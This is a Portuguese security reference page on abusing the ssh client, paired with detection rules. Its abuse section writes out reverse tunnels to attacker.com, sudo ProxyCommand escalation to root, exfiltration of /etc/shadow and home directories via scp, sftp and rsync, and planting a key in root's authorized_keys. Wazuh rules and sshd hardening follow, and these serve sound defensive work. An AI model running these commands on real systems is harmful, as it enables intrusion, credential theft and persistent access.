# ssh

**Plataforma:** Linux / macOS / Unix

**Categorias:** Shell reverso, Tunelamento, Pivoting, Exfiltração, Bypass de firewall, Persistência

**MITRE ATT&CK:** T1572 (Protocol Tunneling), T1021.004 (Remote Services — SSH), T1090 (Proxy), T1048 (Exfiltration)

**Referência ofensiva:** https://gtfobins.org/gtfobins/ssh/

---

## O que é o ssh

O SSH (Secure Shell) é o protocolo padrão para acesso remoto seguro em sistemas Unix. O cliente `ssh` está presente em absolutamente todo sistema Linux e macOS, e no Windows a partir do Windows 10. É usado diariamente por administradores, desenvolvedores e sistemas automatizados para acesso remoto, transferência de arquivos e execução de comandos.

Além do acesso interativo, o SSH tem capacidades avançadas de tunelamento que permitem criar proxies SOCKS, encaminhar portas e criar túneis reversos — recursos projetados para administração legítima de sistemas que frequentemente são abusados para pivoting e evasão de controles de rede.

---

## Por que atacantes usam o ssh

O SSH é o protocolo de tunelamento mais furtivo disponível em Linux por uma razão simples: seu tráfego é cifrado, usa a porta 22 que está aberta em praticamente todo firewall corporativo, e é amplamente usado por administradores — o que torna a detecção baseada em tráfego praticamente impossível sem inspeção profunda. Em pós-exploração, o SSH é frequentemente usado para criar túneis persistentes que mantêm acesso ao ambiente mesmo após reinicializações.

Adicionalmente, o cliente ssh tem capacidades de escape de shell restrito via comandos de sessão e pode ser usado para escalar privilégios quando configurado incorretamente no sudoers.

---

## Técnicas de abuso

### Shell reverso via SSH (tunnel reverso)

O túnel reverso SSH permite que o atacante receba conexões em sua máquina que são originadas no alvo — contornando firewalls que bloqueiam conexões de entrada mas permitem saída na porta 22.

```bash
# Na vítima: criar túnel reverso — porta 4444 do atacante encaminha para localhost:22 da vítima
ssh -R 4444:localhost:22 attacker.com -N -f

# O atacante então se conecta ao seu próprio localhost:4444 para acessar a vítima
# (na máquina do atacante)
ssh -p 4444 usuario@localhost

# Versão com autenticação por chave (mais furtiva, sem senha)
ssh -R 4444:localhost:22 -i /tmp/.key attacker.com -N -f -o StrictHostKeyChecking=no
```

### Proxy SOCKS via SSH (pivoting)

O proxy SOCKS permite rotear qualquer tráfego TCP através de um host comprometido, alcançando redes internas que não estão diretamente acessíveis:

```bash
# Na vítima comprometida: criar proxy SOCKS na porta 1080 da máquina local do atacante
ssh -D 1080 -N -f usuario@alvo.com

# Todo tráfego roteado via proxychains passa pela rede interna do alvo
# (no atacante, com proxychains configurado para 127.0.0.1:1080)
proxychains nmap -sT 192.168.1.0/24
proxychains evil-winrm -i 192.168.1.100 -u Administrator -p 'Senha123'
```

### Port forwarding local (acesso a serviços internos)

```bash
# Encaminhar porta local 3306 para MySQL interno na rede do alvo
ssh -L 3306:192.168.1.100:3306 usuario@gateway.alvo.com -N -f

# Acessar banco de dados interno diretamente
mysql -h 127.0.0.1 -u root -p

# Encaminhar acesso a painel administrativo interno
ssh -L 8080:10.0.0.50:80 usuario@bastion.alvo.com -N -f
# Acessar: http://localhost:8080
```

### Escape de shell restrito via SSH local

```bash
# Se o SSH está disponível em um shell restrito:
ssh localhost   # abre uma sessão SSH local com shell completo

# Se a conexão local é permitida
ssh -o StrictHostKeyChecking=no localhost /bin/bash
```

### Escalada de privilégios via sudo

```bash
# Se sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/ssh
sudo ssh -o ProxyCommand='/bin/bash -p' localhost
# Isso executa /bin/bash como root via ProxyCommand
```

### Exfiltração via SCP/SFTP

```bash
# Exfiltrar arquivo via scp (cifrado, usa porta 22)
scp /etc/shadow usuario@attacker.com:/tmp/shadow

# Exfiltrar diretório completo
scp -r /home/ usuario@attacker.com:/tmp/loot/

# Via sftp (mais silencioso, modo interativo)
sftp usuario@attacker.com
put /etc/shadow

# Via rsync sobre SSH
rsync -avz /home/ usuario@attacker.com:/tmp/loot/
```

### Persistência via chave SSH autorizada

```bash
# Injetar chave pública do atacante no authorized_keys do root
echo "ssh-rsa AAAA... attacker" >> /root/.ssh/authorized_keys

# Criar arquivo known_hosts falso para evitar prompt de verificação
ssh-keyscan attacker.com >> /root/.ssh/known_hosts
```

---

## Técnicas de bypass e evasão

### Tunelamento SSH sobre porta 443 ou 80

Alguns ambientes bloqueiam a porta 22 de saída mas permitem 443. O servidor SSH pode ser configurado para escutar em 443, e a conexão parece tráfego HTTPS.

```bash
# Conectar ao servidor SSH do atacante na porta 443
ssh -p 443 usuario@attacker.com

# Com proxy SOCKS reverso
ssh -R 1080 -p 443 usuario@attacker.com -N -f
```

### Uso de ProxyJump para encadear hosts

```bash
# Acessar Host C passando por Host B (comprometido)
ssh -J usuario@hostB usuario@hostC

# Encadear múltiplos hosts
ssh -J usuario@hostB,usuario@hostC usuario@hostD
```

### SSH com Keep-Alive para manter túnel persistente

```bash
# Manter o túnel vivo mesmo sem atividade
ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=99999 \
    -R 4444:localhost:22 attacker.com -N -f

# Com autorestart via bash loop
while true; do
  ssh -R 4444:localhost:22 attacker.com -N -o ExitOnForwardFailure=yes
  sleep 30
done &
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- ssh com `-R` (reverse port forward) para destino externo — túnel reverso para C2
- ssh com `-D` (dynamic SOCKS proxy) — pivoting via proxy SOCKS
- ssh com ProxyCommand contendo shell ou interpretador — escalada ou execução de código
- ssh iniciado por processo filho de servidor web ou daemon
- Conexões SSH de saída para destinos externos não inventariados

**Indicadores de média relevância:**

- ssh com `-L` (local port forward) para endereços internos — tunelamento para serviços internos
- ssh com `-N -f` (background, sem comando) — tunnel persistente sem sessão interativa visível
- scp ou sftp transferindo arquivos sensíveis para destino externo

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0100-gtfobins_network.xml -->

<!-- ssh com túnel reverso para exterior -->
<rule id="100248" level="13">
  <if_group>auditd</if_group>
  <field name="audit.command">ssh</field>
  <field name="audit.execve" type="pcre2">-R\s+\d+:</field>
  <description>ssh com port forward reverso — possivel tunel de C2 ou bypass de firewall</description>
  <mitre>
    <id>T1572</id>
    <id>T1090</id>
  </mitre>
</rule>

<!-- ssh com proxy SOCKS dinâmico -->
<rule id="100249" level="12">
  <if_group>auditd</if_group>
  <field name="audit.command">ssh</field>
  <field name="audit.execve" type="pcre2">-D\s+\d+</field>
  <description>ssh com proxy SOCKS dinamico — possivel pivoting para rede interna</description>
  <mitre>
    <id>T1090</id>
  </mitre>
</rule>

<!-- ssh com ProxyCommand contendo shell -->
<rule id="100250" level="14">
  <if_group>auditd</if_group>
  <field name="audit.command">ssh</field>
  <field name="audit.execve" type="pcre2">ProxyCommand.*(/bin/bash|/bin/sh|python|perl)</field>
  <description>ssh com ProxyCommand executando shell — possivel escalada de privilegios ou RCE</description>
  <mitre>
    <id>T1059.004</id>
    <id>T1548.001</id>
  </mitre>
</rule>

<!-- scp transferindo arquivos sensíveis -->
<rule id="100251" level="11">
  <if_group>auditd</if_group>
  <field name="audit.command">scp</field>
  <field name="audit.execve" type="pcre2">/etc/shadow|/etc/passwd|/root/|id_rsa|\.pem|\.key</field>
  <description>scp transferindo arquivo sensivel — possivel exfiltracao de credenciais</description>
  <mitre>
    <id>T1048</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Administradores usando port forwarding legítimo:** port forwarding via SSH é uma ferramenta de administração legítima e muito usada. O indicador relevante é a combinação de destino externo não inventariado com `-N -f` (background sem sessão interativa). Port forwards para sistemas internos conhecidos por administradores identificados têm baixo risco.

**CI/CD e automação:** pipelines usam SSH intensivamente para deployment. Filtre por usuário de serviço do pipeline e por destinos conhecidos (servidores de produção inventariados).

---

## Proteção e controles defensivos

**Desabilitar port forwarding no servidor SSH:** no `/etc/ssh/sshd_config` dos servidores que não precisam de tunneling, desabilite o port forwarding:

```
AllowTcpForwarding no
GatewayPorts no
PermitTunnel no
```

Isso não afeta conexões SSH normais — apenas impede que usuários criem túneis no servidor.

**Autenticação por chave com princípio do menor privilégio:** implemente autenticação SSH apenas por chave, desabilite senhas, e use `authorized_keys` com opções restritivas como `command=""` para contas de serviço que não precisam de shell interativo.

**Monitoramento de conexões SSH de saída:** em servidores de produção que não deveriam iniciar conexões SSH (apenas receber), qualquer conexão de saída na porta 22 ou 443 partindo de processos de aplicação deve gerar alerta.

---

## Referências

- GTFOBins — ssh: https://gtfobins.org/gtfobins/ssh/
- MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/
- MITRE ATT&CK T1090: https://attack.mitre.org/techniques/T1090/
- MITRE ATT&CK T1021.004: https://attack.mitre.org/techniques/T1021/004/
